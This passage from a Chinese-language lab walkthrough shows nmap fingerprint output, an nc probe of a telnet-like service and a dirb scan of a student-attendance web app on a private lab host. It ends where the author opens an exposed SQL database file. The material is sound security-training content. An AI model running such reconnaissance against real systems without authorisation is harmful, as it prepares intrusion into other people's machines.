operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(Help,1C,"</span>Verificatio</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>n\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(SSLSessionReq,1C,"</span>Verificatio</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>n\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(TerminalServerCookie,1C,"</span>Veri</pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>fication\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(TLSSessionReq,1C,"</span>Veri</pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>fication\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(Kerberos,1C,"</span>Verificat</pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ion\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(SMBProgNeg,1C,"</span>Verification</pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(X11Probe,1C,"</span>Verification\x20C</pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ode<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(FourOhFourRequest,1C,"</span>Verification\</pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LPDString,1C,"</span>Verification\x20C</pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ode<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LDAPSearchReq,1C,"</span>Verification\x20C</pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ode<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LDAPBindReq,1C,"</span>Verification\x20Cod</pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>e<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(SIPOptions,1C,"</span>Verification\x20Code<span class="token operator">:</span>\</pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LANDesk-RC,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(TerminalServer,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\</pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(NCP,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\</pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(NotesRPC,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\</pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token number">0</span>\xe2\x1c<span class="token string">")%r(JavaRMI,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\</pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>x1c<span class="token string">")%r(WMSRequest,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c</pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token string">")%r(oracle-tns,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c"<span class="token punctuation">)</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token function">r</span><span class="token punctuation">(</span>ms<span class="token operator">-</span>sql<span class="token operator">-</span>s<span class="token punctuation">,</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span>afp</pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token punctuation">,</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token constant">MAC</span> <span class="token literal-property property">Address</span><span class="token operator">:</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token constant">F2</span><span class="token operator">:</span><span class="token constant">EC</span><span class="token operator">:</span><span class="token number">94</span> <span class="token punctuation">(</span>Oracle VirtualBox virtual <span class="token constant">NIC</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>No exact <span class="token constant">OS</span> matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>If you know what <span class="token constant">OS</span> is running on it<span class="token punctuation">,</span> see https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">IP</span> <span class="token literal-property property">fingerprint</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">SCAN</span><span class="token punctuation">(</span><span class="token constant">V</span><span class="token operator">=</span><span class="token number">7.80</span><span class="token operator">%</span><span class="token constant">E</span><span class="token operator">=</span><span class="token number">4</span><span class="token operator">%</span><span class="token constant">D</span><span class="token operator">=</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">9</span><span class="token operator">%</span><span class="token constant">OT</span><span class="token operator">=</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">CT</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token constant">CU</span><span class="token operator">=</span><span class="token number">37182</span><span class="token operator">%</span><span class="token constant">PV</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DS</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">=</span><span class="token constant">D</span><span class="token operator">%</span><span class="token constant">G</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">M</span><span class="token operator">=</span><span class="token number">080027</span><span class="token operator">%</span><span class="token constant">T</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">M</span><span class="token operator">=</span>61614D44<span class="token operator">%</span><span class="token constant">P</span><span class="token operator">=</span>x86_64<span class="token operator">-</span>pc<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">)</span><span class="token constant">SEQ</span><span class="token punctuation">(</span><span class="token constant">SP</span><span class="token operator">=</span><span class="token number">102</span><span class="token operator">%</span><span class="token constant">GCD</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token constant">ISR</span><span class="token operator">=</span><span class="token number">108</span><span class="token operator">%</span><span class="token constant">TI</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">CI</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">II</span><span class="token operator">=</span><span class="token constant">I</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token operator">%</span><span class="token constant">TS</span><span class="token operator">=</span><span class="token constant">A</span><span class="token punctuation">)</span><span class="token constant">OPS</span><span class="token punctuation">(</span><span class="token constant">O1</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O2</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O3</span><span class="token operator">=</span><span class="token constant">M5B4NNT11NW7</span><span class="token operator">%</span><span class="token constant">O4</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token number">5</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O6</span><span class="token operator">=</span><span class="token constant">M5B4ST11</span><span class="token punctuation">)</span><span class="token constant">WIN</span><span class="token punctuation">(</span><span class="token constant">W1</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W2</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W3</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W4</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W5</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W6</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token punctuation">)</span><span class="token constant">ECN</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token constant">FAF0</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token constant">M5B4NNSNW7</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T1</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">O</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">S</span><span class="token operator">+</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">AS</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T2</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token constant">T3</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token constant">T4</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">A</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">R</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T5</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">S</span><span class="token operator">+</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">AR</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T6</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">A</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">R</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T7</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">S</span><span class="token operator">+</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">AR</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">U1</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">N</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">IPL</span><span class="token operator">=</span><span class="token number">164</span><span class="token operator">%</span><span class="token constant">UN</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">RIPL</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RID</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RIPCK</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RUCK</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RUD</span><span class="token operator">=</span><span class="token constant">G</span><span class="token punctuation">)</span><span class="token constant">IE</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DFI</span><span class="token operator">=</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">N</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">=</span><span class="token constant">S</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre>Network Distance<span class="token operator">:</span> <span class="token number">1</span> hop</pre></td></tr><tr><td data-num="69"></td><td><pre>Service Info<span class="token operator">:</span> <span class="token constant">OS</span><span class="token operator">:</span> Linux<span class="token punctuation">;</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel</pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token constant">TRACEROUTE</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token constant">HOP</span> <span class="token constant">RTT</span>     <span class="token constant">ADDRESS</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token number">1</span>   <span class="token number">0.53</span> ms <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token constant">OS</span> and Service detection performed<span class="token punctuation">.</span> Please report any incorrect results at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span></pre></td></tr><tr><td data-num="76"></td><td><pre>Nmap done<span class="token operator">:</span> <span class="token number">1</span> <span class="token constant">IP</span> <span class="token function">address</span> <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">21.19</span> seconds</pre></td></tr></table></figure><p>可以看到存在三个端口：22 23 80</p>
<p>使用 nc 连接 23 端口发现需要输入认证码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nc <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span> <span class="token number">23</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011213558450-539935285.png" alt="" /></p>
<p>先放着，访问 80 端口：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011222246168-1851680717.png" alt="" /></p>
<p>得到一个登陆页面。</p>
<p>使用 dirb 扫描这个页面下的文件目录：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>root@kali<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# dirb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">DIRB</span> v2<span class="token punctuation">.</span><span class="token number">22</span>    </pre></td></tr><tr><td data-num="5"></td><td><pre>By The Dark Raver</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token constant">START_TIME</span><span class="token operator">:</span> Sat Oct  <span class="token number">9</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span><span class="token number">29</span> <span class="token number">2021</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">URL_BASE</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token constant">WORDLIST_FILES</span><span class="token operator">:</span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>dirb<span class="token operator">/</span>wordlists<span class="token operator">/</span>common<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>                                                                           <span class="token constant">GENERATED</span> <span class="token constant">WORDS</span><span class="token operator">:</span> <span class="token number">4612</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span> Scanning <span class="token constant">URL</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                                                                                                                                                      <span class="token operator">==</span><span class="token operator">></span> <span class="token constant">DIRECTORY</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>assets<span class="token operator">/</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                                                                           <span class="token operator">==</span><span class="token operator">></span> <span class="token constant">DIRECTORY</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>database<span class="token operator">/</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">+</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>index<span class="token punctuation">.</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token constant">CODE</span><span class="token operator">:</span><span class="token number">302</span><span class="token operator">|</span><span class="token constant">SIZE</span><span class="token operator">:</span><span class="token number">14619</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                                                                          </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span> Entering directory<span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>assets<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                                                                           <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> <span class="token constant">WARNING</span><span class="token operator">:</span> Directory <span class="token constant">IS</span> <span class="token constant">LISTABLE</span><span class="token punctuation">.</span> No need to scan it<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                                                                          </pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span> Entering directory<span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>database<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                                                                           <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> <span class="token constant">WARNING</span><span class="token operator">:</span> Directory <span class="token constant">IS</span> <span class="token constant">LISTABLE</span><span class="token punctuation">.</span> No need to scan it<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                                                                               </pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token constant">END_TIME</span><span class="token operator">:</span> Sat Oct  <span class="token number">9</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span><span class="token number">33</span> <span class="token number">2021</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token constant">DOWNLOADED</span><span class="token operator">:</span> <span class="token number">4612</span> <span class="token operator">-</span> <span class="token constant">FOUND</span><span class="token operator">:</span> <span class="token number">1</span></pre></td></tr></table></figure><p>可以发现有个 database 路径，访问该路径：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>database<span class="token operator">/</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011224102460-2040444434.png" alt="" /></p>
<p>由此访问发现的 <code>student_attendance_db.sql</code>  文件，得到：</p>
